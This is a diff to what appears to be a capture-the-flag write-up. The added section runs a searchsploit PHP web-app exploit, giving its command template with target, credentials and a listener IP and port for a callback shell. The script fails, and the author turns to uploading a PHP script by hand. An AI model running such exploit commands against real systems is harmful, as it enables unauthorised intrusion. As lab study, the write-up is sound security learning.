@@ -53,5 +53,12 @@ searchsploit -m php/webapps/50978.py
 ![urlUpload](./urlUpload.png)
 - when going to the URL in the browser, we are indeed able to upload an image file
 
+# Exploitation
+Let's run the script found from searchsploit. The format for the flags are shown below.
+```
+python3 exploit.py -t [target url] -u [username] -p [password] -i [listener ip] -n [listener port]
+```
+![firstrun](./firstrun.png)
 
+Unfortunately, the script does not run correctly and fails in uploading the script. We can manually upload a PHP script as shown by the output.
 
